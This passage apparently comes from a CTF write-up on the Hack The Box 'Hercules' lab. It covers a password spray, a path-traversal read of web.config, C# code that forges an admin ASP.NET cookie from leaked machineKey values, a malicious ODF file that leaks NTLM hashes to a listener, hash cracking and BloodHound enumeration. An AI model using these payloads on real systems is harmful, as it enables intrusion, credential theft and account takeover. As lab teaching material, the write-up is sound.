LDAP        10.129.11.157   389    DC               [-] hercules.htb\camilla.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\clarissa.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\elijah.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\fiona.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\harris.d:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\heather.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\jacob.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\jennifer.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\jessica.e:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\joel.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\johanna.f:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
LDAP        10.129.11.157   389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
```

The majority of authentication attempts failed with the following Kerberos error:

```text
KDC_ERR_PREAUTH_FAILED
```

This response indicates that the targeted accounts exist within the domain, but the supplied password is incorrect for those users. Such results are typical during a password spray, confirming that the recovered credential was not universally valid across the enumerated accounts.

One authentication attempt, however, produced a different outcome:

```text
[+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
```

Unlike the previous attempts, this request completed successfully, confirming that the recovered password belonged to the `ken.w` account. The successful LDAP authentication validated both the username and password, providing a set of working domain credentials that could be used for subsequent enumeration and exploitation.

All we need to do is to login using `ken.w` user.

After successfully accessing the portal, I began exploring the available functionality to identify any useful information. While navigating the interface, I noticed several links in the left-hand navigation pane. Among them, the `Mail` section appeared particularly interesting, so I opened it for further inspection.

The mailbox contained three messages titled **"Site Maintenance"**, **"Important"**, and **"From the Boss"**. These emails appeared to contain internal communications, making them a promising source of information for the next stage of the assessment.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZm7rj2ckUWvAllumfHnL%252FScreenshot%2520%282798%29.png%3Falt%3Dmedia%26token%3D78ca26ac-b7bd-4323-8cf7-32e86e3b6cbc&width=768&dpr=3&quality=100&sign=4edccd5b&sv=2)

Next, I explored the `Downloads` section from the navigation menu to examine the files made available to authenticated users. The page listed three downloadable documents associated with internal business processes:

* **Form 1** – Registration
* **Form 2** – Applications
* **Form 3** – Feedback

Because these files were generated and served by the web application rather than being linked as static resources, the functionality appeared to rely on backend file handling. This made the download feature a promising candidate for testing vulnerabilities related to insecure file access.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fz6yTlTzkZ0CHQPZxmakm%252FScreenshot%2520%282832%29.png%3Falt%3Dmedia%26token%3D116c291d-b297-4f42-a22a-502ff9a70c33&width=768&dpr=3&quality=100&sign=94f4ba9b&sv=2)

To examine how the download functionality operated, I intercepted the request with **Burp Suite** and selected **Form 1 – Registration**. The application generated the following HTTP request:

```text
GET /Home/Download?fileName=registration.pdf
```

This revealed that the application determines which file to return based on the value of the `fileName` parameter, making it a suitable target for further testing of the download mechanism.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXz2YnWMT1b01GuaXUWFA%252FScreenshot%2520%282799%29.png%3Falt%3Dmedia%26token%3D9f3e4e56-b9ad-4279-8dd9-bf529b02b035&width=768&dpr=3&quality=100&sign=f7e46318&sv=2)

The request revealed that the application relies on the user-supplied `fileName` parameter to determine which file to retrieve. This behavior immediately suggested that the download functionality could be susceptible to **path traversal**, warranting further investigation into whether arbitrary file access was possible.

## Exploiting Path Traversal to Access Sensitive Configuration Files

To determine whether the download functionality was vulnerable to **path traversal**, I modified the intercepted request in **Burp Repeater** to target the `web.config` file, a common configuration file used by **ASP.NET** applications:

```text
GET /Home/Download?fileName=../../web.config
```

This payload attempts to traverse outside the intended download directory and access a sensitive configuration file located higher in the application's directory structure.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Ft8RJa27yyfBxXsyUa5On%252FScreenshot%2520%282800%29.png%3Falt%3Dmedia%26token%3D7fc541c4-c5ea-489a-9c13-382ce1f51b0e&width=768&dpr=3&quality=100&sign=6dd7a874&sv=2)

The retrieved `web.config` file exposed sensitive application configuration data, most notably the `<machineKey>` element.

Within **ASP.NET** applications, the `machineKey` serves as a core cryptographic component responsible for securing multiple application features. Specifically, it is used to:

1. Encrypt and decrypt **Forms Authentication** cookies.
2. Validate the integrity of **ViewState** data.
3. Protect **Forms Authentication** tickets from tampering.

Disclosure of these cryptographic keys can have severe security implications. With access to the `machineKey`, an attacker may be able to forge trusted authentication cookies, impersonate legitimate users, hijack active sessions, or, in certain scenarios, bypass the application's authentication mechanisms entirely.

## Setting Up an Environment for Legacy ASP.NET Authentication Cookie Generation

After recovering the **ASP.NET** `machineKey` values from the configuration file, the next objective was to reproduce the application's authentication process locally so that valid **Forms Authentication** cookies could be generated. Based on the application's behavior, it appeared to rely on the legacy **ASP.NET Forms Authentication** framework, requiring tooling that was compatible with older .NET implementations.

To prepare the environment, I created a new **.NET console application**, which would later be used to generate authentication cookies using the extracted cryptographic keys.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ dotnet new console -o LegAuthConsole
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj...
  Determining projects to restore...
  Restored /home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj (in 7.86 sec).
Restore succeeded.
```

This generated a minimal **.NET 6.0** console application that served as the foundation for building a custom authentication cookie generator. The successful project creation, along with the automatic restoration of the required dependencies, confirmed that the development environment was ready for implementing the cookie-forging logic.

Now let's navigate to the `LegAuthConsole` directory.

```shell
cd LegAuthConsole
```

Because **.NET 6** does not provide native support for generating **legacy ASP.NET Forms Authentication** cookies, an additional compatibility library was required. To enable this functionality, I installed the `AspNetCore.LegacyAuthCookieCompat` NuGet package:

```shell
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
```

This package provides compatibility with the legacy Forms Authentication implementation, allowing authentication cookies to be generated using the previously recovered `machineKey` values in a format accepted by the target application.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules/LegAuthConsole]
└─$ dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
  Determining projects to restore...
  Writing /tmp/tmpkxIFod.tmp
info : X.509 certificate chain validation will use the fallback certificate bundle at '/usr/share/dotnet/sdk/6.0.400/trustedroots/codesignctl.pem'.
info : Adding PackageReference for package 'AspNetCore.LegacyAuthCookieCompat' into project '/home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj'.
info : Restoring packages for /home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj...
info :   GET https://api.nuget.org/v3-flatcontainer/aspnetcore.legacyauthcookiecompat/index.json
info :   OK https://api.nuget.org/v3-flatcontainer/aspnetcore.legacyauthcookiecompat/index.json 609ms
.
.
.
info : Installed System.Reflection 4.3.0 from https://api.nuget.org/v3/index.json with content hash KMiAFoW7MfJGa9nDFNcfu+FpEdiHpWgTcS2HdMpDvt9saK3y/G4GwprPyzqjFH9NTaGPQeWNHU+iDlDILj96aQ==.
info : Installed System.Reflection.Primitives 4.3.0 from https://api.nuget.org/v3/index.json with content hash 5RXItQz5As4xN2/YUDxdpsEkMhvw3e6aNveFXUn4Hl/udNTCNhnKp8lT9fnc3MhvGKh1baak5CovpuQUXHAlIA==.
info : Installed System.Runtime 4.3.0 from https://api.nuget.org/v3/index.json with content hash JufQi0vPQ0xGnAczR13AUFglDyVYt4Kqnz1AZaiKZ5+GICq0/1MH/mO/eAJHt/mHW1zjKBJd7kV26SrxddAhiw==.
info : Package 'AspNetCore.LegacyAuthCookieCompat' is compatible with all the specified frameworks in project '/home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj'.
info : PackageReference for package 'AspNetCore.LegacyAuthCookieCompat' version '2.0.5' added to file '/home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj'.
info : Writing assets file to disk. Path: /home/blxckwolf/HTB/Hercules/LegAuthConsole/obj/project.assets.json
log  : Restored /home/blxckwolf/HTB/Hercules/LegAuthConsole/LegAuthConsole.csproj (in 21.33 sec).
```

The installed package provides compatibility with the legacy **ASP.NET Forms Authentication** implementation, making it possible to generate authentication cookies using the previously extracted `machineKey` values. During installation, **NuGet** automatically resolved and installed all required dependencies, including the cryptographic and runtime components needed for the project.

While the installation output contains numerous dependency and restore messages, the important result is that the setup completed successfully. With the compatibility library in place, the project now supports:

1. Generating legacy **Forms Authentication** tickets.
2. Encrypting and signing authentication cookies with the recovered `machineKey` values.
3. Producing cookies that are compatible with the older **ASP.NET Forms Authentication** mechanism used by the target application.

## Forging a Valid Legacy ASP.NET Forms Authentication Cookie

After obtaining the application's `machineKey` values, I shifted my focus to creating a trusted **Forms Authentication** cookie that the server would accept as legitimate. Because the application used the legacy **ASP.NET Forms Authentication** framework, possession of the cryptographic keys made it possible to reproduce the authentication process outside the target environment.

To achieve this, I implemented a custom `Program.cs` application that generates a `FormsAuthenticationTicket` and protects it using the recovered cryptographic keys. The resulting output is a correctly encrypted and signed authentication cookie that matches the format expected by the target application, enabling authentication without valid user credentials.

```C#
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
        string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        if (validationKey.Length > 128)
        {
            validationKey = validationKey.Substring(0, 128);
        }

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var formsAuthenticationTicket = new FormsAuthenticationTicket(
            1,
            "web_admin",
            issueDate,
            expiryDate,
            false,
            "Web Administrators",
            "/"
        );

        var legacyEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes,
            validationKeyBytes,
            ShaVersion.Sha256
        );

        var encryptedText = legacyEncryptor.Encrypt(formsAuthenticationTicket);
        Console.WriteLine(encryptedText);
    }
}
```

The custom program reproduces the application's authentication process by performing the following operations:

1. **Initialize the application's cryptographic keys**
   The `validationKey` and `decryptionKey` extracted from `web.config` are loaded into the program. These keys are used to sign and encrypt **Forms Authentication** tickets, allowing the generated cookie to match the format expected by the application.
2. **Prepare the validation key**
   Because **ASP.NET** expects a specific key length when using `HMACSHA256`, the validation key is adjusted accordingly to ensure compatibility with the server's implementation.
3. **Generate a privileged authentication ticket**
   A new `FormsAuthenticationTicket` is created for the `web_admin` account. The ticket includes valid issuance and expiration timestamps, is configured as a non-persistent session, and contains the appropriate `userData` value (`Web Administrators`) so that it aligns with the application's expected authorization data.
4. **Produce a trusted authentication cookie**
   Finally, the ticket is encrypted and digitally signed using `LegacyFormsAuthenticationTicketEncryptor`. By leveraging the recovered `machineKey` values, the resulting cookie is indistinguishable from one generated by the target application itself, making it suitable for authentication.

Now let's build and run the program:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules/LegAuthConsole]
└─$ dotnet restore && dotnet build && dotnet run
  Determining projects to restore...
  All projects are up-to-date for restore.
MSBuild version 17.3.0+92e077650 for .NET
  Determining projects to restore...
  All projects are up-to-date for restore.
  LegAuthConsole -> /home/blxckwolf/HTB/Hercules/LegAuthConsole/bin/Debug/net6.0/LegAuthConsole.dll

Build succeeded.                                                                                                                     
    0 Warning(s)                                                                                                                     
    0 Error(s)

Time Elapsed 00:00:01.06
109F0060ABCB718C9CD7172D26DFC146C632B95F58F44616274642B1548891C72DAA0EAFCBBEC428A4604A420A4EE9194D20BC41579374413398D8E469BB530A1BD55FBA4E471609396C01A993F930AC2200C076E6AFAF100F8FDFA64D34CD1780A508C0CC7CC2FE4A8671EAB93B777A0462A770E71E4473753E05BF3404A8143302142D02F5130581568D155A7F14635400A10559B4FD6C9361A3E312522C3E09C6C0A379BF3D5ED9DDB3AE26DEA99EC668130FF04087DD42DDEDD36D2741E4
```

After all required dependencies had been restored and the project was compiled successfully, I executed the application locally. The program generated a lengthy hexadecimal value representing a **valid ASP.NET Forms Authentication cookie**, encrypted and signed using the recovered `machineKey` values.

```text
109F0060ABCB718C9CD7172D26DFC146C632B95F58F44616274642B1548891C72DAA0EAFCBBEC428A4604A420A4EE9194D20BC41579374413398D8E469BB530A1BD55FBA4E471609396C01A993F930AC2200C076E6AFAF100F8FDFA64D34CD1780A508C0CC7CC2FE4A8671EAB93B777A0462A770E71E4473753E05BF3404A8143302142D02F5130581568D155A7F14635400A10559B4FD6C9361A3E312522C3E09C6C0A379BF3D5ED9DDB3AE26DEA99EC668130FF04087DD42DDEDD36D2741E4
```

## Accessing Administrative Functionality Using the Forged Authentication Cookie

Returning to the **Hercules Portal**, I navigated to the **Forms** section and discovered that it provided a file upload capability. By this stage, the previously disclosed `machineKey` values had escalated from an information disclosure issue to a complete authentication compromise.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFGk8nYtBvpm1vS0lUgMY%252FScreenshot%2520%282833%29.png%3Falt%3Dmedia%26token%3D8f85a1a0-228a-4cce-85ba-33982a5187b5&width=768&dpr=3&quality=100&sign=52bf3bf4&sv=2)

After replacing the browser's existing **Forms Authentication** cookie with the forged one, the application immediately recognized the session as belonging to the privileged `web_admin` account. This granted access to administrative functionality that was previously unavailable, including the file upload feature.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJtOXEyzOveBfgdf3nvKm%252FScreenshot%2520%282801%29.png%3Falt%3Dmedia%26token%3D433fea12-155b-4fe4-b7e8-305d4fa65127&width=768&dpr=3&quality=100&sign=7d41a639&sv=2)

## Leveraging the Upload Feature to Trigger Outbound Authentication

With administrative access established and the file upload functionality available, I explored whether the feature could be abused to elicit outbound authentication from the target environment.

In Windows environments, opening a document that references an external network resource can cause the system to automatically initiate **NTLM authentication** to that remote location. If the destination is under an attacker's control, the resulting **NetNTLMv2** challenge-response can be captured for subsequent analysis.

To take advantage of this behavior, I uploaded a specially crafted **ODF/ODT** document instead of a standard file. The document was designed to reference an external resource, with the goal of triggering an outbound authentication request when it was processed by the application or reviewed by a user.

## Creating a Malicious ODF Document to Elicit NTLM Authentication

After obtaining administrative access to the portal, I turned my attention to the file upload functionality as a potential avenue for further exploitation. The objective was to upload a document that would induce the target environment to initiate an outbound connection to an attacker-controlled host, thereby exposing Windows authentication traffic.

The approach relied on embedding a reference to an external network resource within an **ODF/ODT** document. When the document is processed or opened, Windows may automatically attempt **NTLM authentication** to the remote location. If the destination is under the attacker's control, the resulting **NetNTLMv2** challenge-response can be captured and later used for offline password cracking or as a foothold for subsequent attack stages.

For this we use this [tool](https://github.com/lof1sec/Bad-ODF) to generate a malicious `.odt` file.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules/LegAuthConsole]
└─$ python3 Bad-ODF.py
/home/blxckwolf/HTB/Hercules/LegAuthConsole/Bad-ODF.py:29: SyntaxWarning: invalid escape sequence '\/'
    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/
/_____/\__,_/\__,_/      \____/_____/_/


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy
@rd_pentest
www.secureyourit.co.uk


Please enter IP of listener: 10.10.15.36
```

The script then requested the IP address of the system that would receive the outbound connection. I supplied the IP address assigned to my **VPN** interface:

```text
Please enter IP of listener: 10.10.15.36
```

This address was embedded into the malicious document as the external network resource. As a result, when the document was opened or processed by the target environment, Windows attempted to contact my host, triggering an outbound **NTLM** authentication request that could be captured.

## Exploiting the Administrative Upload Feature to Trigger NTLM Authentication

After replacing the existing session with the forged `web_admin` authentication cookie, I refreshed the application and verified that the privilege escalation had succeeded. The portal now recognized my session as `web_admin`, granting access to administrative features that were previously unavailable.

One of the newly accessible areas was the **Forms** section. Within **Forms → Report Submission**, I found a workflow that allowed users to submit reports accompanied by file attachments. From an attacker's perspective, this upload mechanism represented an ideal target, as the submitted documents would likely be processed, reviewed, or opened by the application or an administrator, providing an opportunity to trigger further actions through a crafted file.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnVJOmMv46aVy6xb7iQkD%252FScreenshot%2520%282834%29.png%3Falt%3Dmedia%26token%3D588e7799-fe1c-4876-bc0d-83ad3f24b8ba&width=768&dpr=3&quality=100&sign=8789fd33&sv=2)

## Capturing the NetNTLMv2 Authentication Hash

At the same time the malicious document was submitted through the portal, I launched a listener on my attacker machine to monitor for any outbound **NTLM** authentication requests originating from the target environment.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ sudo responder -I tun0
[sudo] password for blxckwolf:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0
.
.
.
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.36]
    Responder IPv6             [dead:beef:2::1122]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-XV6BGHH1HXA]
    Responder Domain Name      [X7UI.LOCAL]
    Responder DCE-RPC Port     [49133]

[+] Listening for events...                                                                                                          

[SMB] NTLMv2-SSP Client   : 10.129.11.157
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:d6b79abaf967a44a:A9551C615EF07DE347EE6BF297A1A10B:0101000000000000807AF353E805DD01BF2D0DD4FE2EB6110000000002000800580037005500490001001E00570049004E002D005800560036004200470048004800310048005800410004003400570049004E002D00580056003600420047004800480031004800580041002E0058003700550049002E004C004F00430041004C000300140058003700550049002E004C004F00430041004C000500140058003700550049002E004C004F00430041004C0007000800807AF353E805DD0106000400020000000800300030000000000000000000000000200000696CBCC9B4356FED79EC21D536B3A0B42D10EA2116B20E084F742A6789332B510A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00330036000000000000000000
```

After the uploaded document was processed by the application, the listener received an incoming **NTLM** authentication request from the target, allowing me to capture a **NetNTLMv2** challenge-response hash.

This interaction confirmed two important observations:

1. The uploaded document was handled by a backend process or reviewed in a manner that caused it to access the embedded external resource.
2. The document processing workflow could be abused to coerce outbound **NTLM** authentication, effectively transforming the upload functionality into a reliable vector for capturing Windows authentication hashes.

## Cracking the Captured Hash Offline

After obtaining the **NetNTLMv2** challenge-response, I moved on to offline password recovery. Because **NetNTLMv2** hashes can be attacked without interacting with the target environment, I used **John the Ripper** to attempt password cracking with the widely used `rockyou.txt` wordlist:

```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Running the attack offline eliminates the need for additional authentication attempts against the target while leveraging a large password corpus to recover the underlying plaintext credential.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules/LegAuthConsole]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Prettyprincess123! (natalie.a)
1g 0:00:00:05 DONE (2026-06-27 03:56) 0.1686g/s 1807Kp/s 1807Kc/s 1807KC/s Princess<3..Powell_
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

The cracking process successfully recovered the plaintext password, confirming that the captured **NetNTLMv2** hash belonged to the domain user `natalie.a`. With valid credentials now available, I had authenticated access to the domain under the `natalie.a` account, enabling the next phase of the assessment.

## Enumerating Active Directory with BloodHound

After obtaining valid domain credentials for `ken.w` (`change*th1s_p@ssw()rd!!`), the next objective was to gain a clearer understanding of the Active Directory environment and identify potential attack paths. Rather than relying solely on manual enumeration, I used **BloodHound** to map relationships between users, groups, computers, and privileges within the domain.

By collecting and analyzing Active Directory data, BloodHound helps uncover opportunities for **privilege escalation** and **lateral movement** that may not be immediately apparent through traditional enumeration techniques.

To enumerate the Active Directory environment, I used `bloodhound-python` to collect comprehensive domain information for subsequent analysis in BloodHound:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ bloodhound-python -u ken.w -p 'change*th1s_p@ssw()rd!!' -c All -d hercules.htb -ns 10.129.11.157 --zip --use-ldap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 18S
INFO: Compressing output into 20260627035850_bloodhound.zip
```

The **BloodHound** collection completed successfully after authenticating with the supplied credentials and obtaining a valid **Kerberos TGT**, confirming that the account had sufficient access to perform domain enumeration. It then connected to the LDAP service on `dc.hercules.htb` and gathered information about the Active Directory environment.

The collected dataset included:

1. **1 domain** (`hercules.htb`)
2. **1 forest**
3. **1 computer** (the domain controller)
4. **49 user accounts**
5. **62 security groups**
6. **9 Organizational Units (OUs)**
7. **2 Group Policy Objects (GPOs)**
8. **19 containers**
9. **0 external trusts**

After completing LDAP enumeration, BloodHound performed additional queries against the domain controller to collect host-specific information before finalizing the dataset for analysis.

With a valid set of domain credentials, the next objective was to analyze the Active Directory environment and identify potential paths for **privilege escalation** and **lateral movement**. Instead of relying on manual inspection, I leveraged **BloodHound** to map the relationships between users, groups, computers, and delegated permissions across the domain.

After collecting the required data using `bloodhound-python`, I imported the generated ZIP archive into the **BloodHound** interface. Visualizing the collected data provided a much clearer view of the domain's trust relationships and exposed potential attack paths that were not immediately apparent through standard enumeration alone.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTkqQ98DXxG15MRbRGYM4%252FScreenshot%2520%282803%29.png%3Falt%3Dmedia%26token%3D673d23d0-6199-4ad9-acfc-5badf5b32169&width=768&dpr=3&quality=100&sign=41e0a75f&sv=2)

## Key Findings from BloodHound

The BloodHound analysis quickly highlighted a number of interesting privilege relationships that could potentially be leveraged for further escalation.

1. `Natalie A.` → `Web Support`

The `Natalie A.` account was identified as a member of the `Web Support` group.

More importantly, this group holds `GenericWrite` permissions over **six different user accounts**. This permission is particularly valuable because it allows an attacker to modify various attributes of the targeted objects, including password-related settings, **Service Principal Names (SPNs)**, and, in certain scenarios, group membership or other security-relevant properties. Such delegated rights can often be abused to facilitate privilege escalation or create additional attack paths within the domain.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FlA0fROP463jS6iHW8xeC%252FScreenshot%2520%282804%29.png%3Falt%3Dmedia%26token%3D6aaaee6f-eb81-4b85-9b21-0b155ca2e96d&width=768&dpr=3&quality=100&sign=8a44efdf&sv=2)

2. `Remote Management Users`

The `Auditor` and `Ashley B.` accounts were identified as members of the `Remote Management Users` group.

Membership in this group commonly permits users to establish interactive or remote management sessions on authorized systems. As a result, these accounts represent attractive targets for **lateral movement**, as compromising them could provide access to additional hosts within the environment.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkIIInOGjLGKiO5YZJY30%252FScreenshot%2520%282806%29.png%3Falt%3Dmedia%26token%3Dd52990aa-1993-4b15-86a9-8a6a27d56399&width=768&dpr=3&quality=100&sign=2ac883ae&sv=2)

3. `Stephen M.` → `Security Helpdesk`

BloodHound also revealed that the `Stephen M.` account is a member of the `Security Helpdesk` group. Although this membership alone does not immediately provide a privilege escalation path, helpdesk roles are commonly delegated administrative permissions over users or systems, making them worthwhile targets for further enumeration and analysis.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9i0Jh1wCUUUr2uvjwsPr%252FScreenshot%2520%282807%29.png%3Falt%3Dmedia%26token%3Dab56b3ef-5b26-42a8-af3a-4cab4e0915bb&width=768&dpr=3&quality=100&sign=b023a6fd&sv=2)

The `ForceChangePassword` permission is delegated over **seven user accounts**, making it one of the most impactful privileges identified during the assessment.

This permission enables an attacker to reset a target user's password without requiring knowledge of the current one. As a result, any account within its scope can be effectively compromised, providing a straightforward path to account takeover and potential privilege escalation.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2ZawJajSTOD1hTP5tW4c%252FScreenshot%2520%282808%29.png%3Falt%3Dmedia%26token%3D7ae0fb76-fb36-4040-a213-abe3e0374726&width=768&dpr=3&quality=100&sign=30a3474a&sv=2)

The permissions uncovered by BloodHound revealed several practical avenues for privilege escalation within the domain.

A compromised member of the `Web Support` group can abuse its `GenericWrite` privileges to modify attributes of multiple user accounts. Likewise, members of the `Security Helpdesk` group possess `ForceChangePassword` rights over several users, enabling them to reset passwords without knowing the existing credentials. When these delegated permissions are combined, they form a viable escalation path from a low-privileged account to higher levels of access.

Rather than relying on trial-and-error or indiscriminate attacks, BloodHound made it possible to identify and prioritize targets based on actual Active Directory permissions. This graph-based approach streamlined the assessment by highlighting the most promising attack paths while minimizing unnecessary enumeration and noise.

## Obtaining a Kerberos TGT to Verify Domain Authentication

After confirming that the recovered credentials for `natalie.a` were valid, I proceeded to test whether the account could successfully authenticate using **Kerberos**. To validate this, I requested a **Ticket Granting Ticket (TGT)** directly from the **Domain Controller** with **Impacket**.

Successfully obtaining a TGT would confirm that the credentials were fully functional for Kerberos authentication and could be used to access additional domain resources.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
